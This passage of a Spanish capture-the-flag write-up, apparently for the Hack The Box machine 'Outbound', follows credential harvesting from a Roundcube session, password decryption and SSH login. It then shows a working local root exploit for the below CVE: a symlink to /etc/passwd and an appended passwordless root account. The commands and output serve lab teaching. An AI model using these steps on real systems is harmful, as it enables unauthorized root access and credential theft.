tzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 | base64 -d | sed <span style="color:#e6db74">&#39;s/;/\r\n/g&#39;</span> | &gt; importante.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Sale el texto decodificado a parte de con un tratamiento para separar mejor el texto y importarlo en un txt</span>
+</span></span></code></pre></div><pre tabindex="0"><code class="language-ls" data-lang="ls">language|s:5:&#34;en_US&#34;
+imap_namespace|a:4:{s:8:&#34;personal&#34;
+a:1:{i:0
+a:2:{i:0
+s:0:&#34;&#34;
+i:1
+s:1:&#34;/&#34;
+}}s:5:&#34;other&#34;
+N
+s:6:&#34;shared&#34;
+N
+s:10:&#34;prefix_out&#34;
+s:0:&#34;&#34;
+}imap_delimiter|s:1:&#34;/&#34;
+imap_list_conf|a:2:{i:0
+N
+i:1
+a:0:{}}user_id|i:1
+username|s:5:&#34;jacob&#34; #Importante
+storage_host|s:9:&#34;localhost&#34;
+storage_port|i:143
+storage_ssl|b:0
+password|s:32:&#34;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&#34; #Importante
+login_time|i:1749397119
+timezone|s:13:&#34;Europe/London&#34;
+STORAGE_SPECIAL-USE|b:1
+auth_secret|s:26:&#34;DpYqv6maI9HxDL5GhcCd8JaQQW&#34;
+request_token|s:32:&#34;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&#34;
+task|s:4:&#34;mail&#34;
+skin_config|a:7:{s:17:&#34;supported_layouts&#34;
+a:1:{i:0
+s:10:&#34;widescreen&#34;
+}s:22:&#34;jquery_ui_colors_theme&#34;
+s:9:&#34;bootstrap&#34;
+s:18:&#34;embed_css_location&#34;
+s:17:&#34;/styles/embed.css&#34;
+s:19:&#34;editor_css_location&#34;
+s:17:&#34;/styles/embed.css&#34;
+s:17:&#34;dark_mode_support&#34;
+b:1
+s:26:&#34;media_browser_css_location&#34;
+s:4:&#34;none&#34;
+s:21:&#34;additional_logo_types&#34;
+a:3:{i:0
+s:4:&#34;dark&#34;
+i:1
+s:5:&#34;small&#34;
+i:2
+s:10:&#34;small-dark&#34;
+}}imap_host|s:9:&#34;localhost&#34;
+page|i:1
+mbox|s:5:&#34;INBOX&#34;
+sort_col|s:0:&#34;&#34;
+sort_order|s:4:&#34;DESC&#34;
+STORAGE_THREAD|a:3:{i:0
+s:10:&#34;REFERENCES&#34;
+i:1
+s:4:&#34;REFS&#34;
+i:2
+s:14:&#34;ORDEREDSUBJECT&#34;
+}STORAGE_QUOTA|b:0
+STORAGE_LIST-EXTENDED|b:1
+list_attrib|a:6:{s:4:&#34;name&#34;
+s:8:&#34;messages&#34;
+s:2:&#34;id&#34;
+s:11:&#34;messagelist&#34;
+s:5:&#34;class&#34;
+s:42:&#34;listing messagelist sortheader fixedheader&#34;
+s:15:&#34;aria-labelledby&#34;
+s:22:&#34;aria-label-messagelist&#34;
+s:9:&#34;data-list&#34;
+s:12:&#34;message_list&#34;
+s:14:&#34;data-label-msg&#34;
+s:18:&#34;The list is empty.&#34;
+}unseen_count|a:2:{s:5:&#34;INBOX&#34;
+i:2
+s:5:&#34;Trash&#34;
+i:0
+}folders|a:1:{s:5:&#34;INBOX&#34;
+a:2:{s:3:&#34;cnt&#34;
+i:2
+s:6:&#34;maxuid&#34;
+i:3
+}}list_mod_seq|s:2:&#34;10&#34;
+</code></pre><p>Como podemos ver hay dos cosas que nos puede dar una <em>pista</em> de donde ir que están en la <strong>línea 19 y 23</strong> que pueden ser posibles contraseñas para el usuario jacob, usamos tanto la <strong>Contraseña</strong> como el <strong>nombre de usuario</strong> para la <strong>aplicación</strong> como para <strong>SSH</strong></p>
+<p>También una buena practica que debemos de realizar siempre es <strong>guardar las contraseñas</strong> <strong>encontradas en un archivo</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Mail Account:
+</span></span><span style="display:flex;"><span>tyler:LhKL1o9Nm3X2
+</span></span><span style="display:flex;"><span>jacob:L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ <span style="color:#75715e">#Posible contraseña que debemos de probar.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SSH Account:
+</span></span><span style="display:flex;"><span>jacob:L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ <span style="color:#75715e">#Posible contraseña que debemos de probar.</span>
+</span></span></code></pre></div><p>Vemos que la <strong>contraseña</strong> no sirve para ninguna, pero volviendo a mirar bien lo que encontramos en vemos que usan algún <strong>tipo de cifrado</strong> para las <strong>contraseñas de usuario</strong>.</p>
+<p>En la maquina dentro de la carpeta que <strong>hostea roundcube</strong> podemos ver un <code>/bin</code> donde se alojan <strong>Script</strong> <code>.sh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>cleandb.sh    gc.sh		jsshrink.sh	msgimport.sh
+</span></span><span style="display:flex;"><span>cssshrink.sh  indexcontacts.sh	makedoc.sh	update.sh
+</span></span><span style="display:flex;"><span>decrypt.sh    initdb.sh		moduserprefs.sh  updatecss.sh
+</span></span><span style="display:flex;"><span>deluser.sh    installto.sh	msgexport.sh	updatedb.shcat 
+</span></span><span style="display:flex;"><span>www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
+</span></span><span style="display:flex;"><span>595mO8DmwGeD
+</span></span></code></pre></div><p>Ponemos las contraseña tanto en nuestro archivo <strong>importante.txt</strong> y volvemos a probarlo tanto en <strong>roundcube</strong> como <strong>SSH</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Mail Account:
+</span></span><span style="display:flex;"><span>tyler:LhKL1o9Nm3X2
+</span></span><span style="display:flex;"><span>jacob:595mO8DmwGeD <span style="color:#75715e">#Posible contraseña que debemos de probar algo que puede hacer que nos huela bien es que tienen las misma longitud, ya que estan creadas seguramente por algun algoritmo.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SSH Account:
+</span></span><span style="display:flex;"><span>jacob:595mO8DmwGeD <span style="color:#75715e">#Posible contraseña que debemos de probar.</span>
+</span></span></code></pre></div><p>Probamos primero en el <strong>Roundcube</strong> y vemos que nos <strong>funciona</strong>:
+![[Pasted image 20251122144639.png]]</p>
+<p>Ahora empezamos <strong>investigar</strong> lo que podemos encontrar por este <strong>nuevo usuario</strong> conseguido, vemos que hay dos correos uno de Mel y otro de Tyler, en el de  Mel nos habla de un posible <strong>escalado de privilegio</strong> que se podría hacer con el <strong>below</strong> y en el de Tyler nos cuenta que tenemos una <strong>nueva contraseña</strong> para nuestra cuenta.</p>
+<p>Guardamos la contraseña que vemos en el correo que nos envio Tyler al archivo importante.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh jacob@outbound.htb
+</span></span><span style="display:flex;"><span>jacob@outbound.htb<span style="color:#e6db74">&#39;s password: gY4Wr3a1evp4 &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Nos conectamos mediante SSH con el usuario jacob</span>
+</span></span><span style="display:flex;"><span>jacob@outbound:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Miramos para escalar privilegios</span>
+</span></span><span style="display:flex;"><span>jacob@outbound:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jacob on outbound:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User jacob may run the following commands on outbound:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Como vimos en el correo que nos envio Mel below puede ser un potencial punto para realizar una escalada de privilegios</span>
+</span></span></code></pre></div><p>Ahora buscamos en el navegador <strong>exploit below</strong> y vemos esta pagina que nos cuentan un <strong>CVE</strong>
+<a href="https://github.com/rvizx/CVE-2025-27591">https://github.com/rvizx/CVE-2025-27591</a>
+Nos explica que es lo que hace el Exploit Code y podemos hacer lo nosotros también</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>jacob@outbound:/home/jacob$ cd /var/log/below
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$ rm -r error_root.log
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$ ln -s /etc/passwd error_root.log
+</span></span><span style="display:flex;"><span>root@outbound:/var/log/below# ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxrwxrwx  <span style="color:#ae81ff">3</span> root  root   <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">22</span> 15:20 .
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">13</span> root  syslog <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">22</span> 15:00 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> jacob jacob    <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">22</span> 15:16 error_jacob.log 
+</span></span><span style="display:flex;"><span>-rw-rw-rw-  <span style="color:#ae81ff">1</span> root  root      <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">22</span> 15:20 error_root.log -&gt; /etc/passwd
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root  root   <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">22</span> 15:00 store
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$ stat /etc/passwd
+</span></span><span style="display:flex;"><span>  File: /etc/passwd
+</span></span><span style="display:flex;"><span>  Size: <span style="color:#ae81ff">1840</span>      	Blocks: <span style="color:#ae81ff">8</span>          IO Block: <span style="color:#ae81ff">4096</span>   regular file
+</span></span><span style="display:flex;"><span>Device: 8,2	Inode: <span style="color:#ae81ff">16522</span>       Links: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Access: <span style="color:#f92672">(</span>0644/-rw-r--r--<span style="color:#f92672">)</span>  Uid: <span style="color:#f92672">(</span>    0/    root<span style="color:#f92672">)</span>   Gid: <span style="color:#f92672">(</span>    0/    root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Access: 2025-11-22 14:59:58.244000256 +0000
+</span></span><span style="display:flex;"><span>Modify: 2025-07-14 16:40:53.253354883 +0000
+</span></span><span style="display:flex;"><span>Change: 2025-07-14 16:40:53.255354883 +0000
+</span></span><span style="display:flex;"><span> Birth: 2025-07-08 21:06:21.791868493 +0000
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$ sudo below
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$ stat /etc/passwd
+</span></span><span style="display:flex;"><span>  File: /etc/passwd
+</span></span><span style="display:flex;"><span>  Size: <span style="color:#ae81ff">1840</span>      	Blocks: <span style="color:#ae81ff">8</span>          IO Block: <span style="color:#ae81ff">4096</span>   regular file
+</span></span><span style="display:flex;"><span>Device: 8,2	Inode: <span style="color:#ae81ff">16522</span>       Links: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Access: <span style="color:#f92672">(</span>0666/-rw-rw-rw-<span style="color:#f92672">)</span>  Uid: <span style="color:#f92672">(</span>    0/    root<span style="color:#f92672">)</span>   Gid: <span style="color:#f92672">(</span>    0/    root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Access: 2025-11-22 14:59:58.244000256 +0000
+</span></span><span style="display:flex;"><span>Modify: 2025-07-14 16:40:53.253354883 +0000
+</span></span><span style="display:flex;"><span>Change: 2025-11-22 15:20:00.804110754 +0000
+</span></span><span style="display:flex;"><span> Birth: 2025-07-08 21:06:21.791868493 +0000
+</span></span><span style="display:flex;"><span>jacob@outbound:/var/log/below$  echo <span style="color:#e6db74">&#39;pwn::0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd; su pwn 
+</span></span><span style="display:flex;"><span>root@outbound:/var/log/below# cd 
+</span></span><span style="display:flex;"><span>root@outbound:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span></code></pre></div>
+        </article>
+
+        <footer style="margin-top: 40px; text-align: center; color: #444; font-size: 0.8em;">
+            <p>_ Terminando sesión... exit</p>
+        </footer>
+    </div>
+</body>
+</html>
